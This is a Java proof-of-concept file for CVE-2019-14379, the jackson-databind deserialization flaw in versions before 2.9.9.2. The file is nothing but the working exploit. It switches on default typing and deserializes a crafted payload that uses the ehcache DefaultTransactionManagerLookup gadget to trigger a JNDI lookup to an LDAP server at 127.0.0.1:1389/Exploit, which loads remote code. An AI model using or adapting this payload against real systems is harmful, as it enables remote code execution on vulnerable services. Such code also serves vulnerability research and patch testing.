package com.test.jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * CVE-2019-14379
 * jackson-databind RCE < 2.9.9.2
 * 依赖：net.sf.ehcache
 */

public class CVE_2019_14379 {
    public static void main(String[] args) throws Exception {
        String payload = "[\"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\"," +
                "{\"properties\":{\"jndiName\":\"ldap://127.0.0.1:1389/Exploit\"}}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object o = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(o);
    }
}
